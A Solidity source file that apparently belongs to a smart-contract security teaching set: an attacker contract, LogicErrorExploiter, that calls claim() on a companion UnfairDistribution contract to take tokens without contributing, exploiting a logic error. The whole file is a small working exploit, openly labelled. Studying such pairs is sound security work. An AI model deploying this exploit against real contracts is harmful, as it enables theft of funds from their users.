// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Attacker Contract: LogicErrorExploiter
// This contract exploits the logic error in the UnfairDistribution contract.
// The vulnerability allows anyone to claim tokens, even if they haven't contributed.

import "./SC03_Logic_Errors_Victim.sol";

contract LogicErrorExploiter {
    UnfairDistribution public vulnerableContract;

    constructor(address vulnerableContractAddress) {
        vulnerableContract = UnfairDistribution(vulnerableContractAddress);
    }

    // Function to receive ETH
    receive() external payable {}

    // Function to execute the attack
    // This function calls the 'claim' function of the UnfairDistribution contract
    // without making any contribution.
    function attack() external {
        // The attacker calls the 'claim' function without having made any contribution.
        // Due to the logic error in the victim contract, this call will succeed.
        vulnerableContract.claim();
    }

    // Function to check the balance of this contract
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
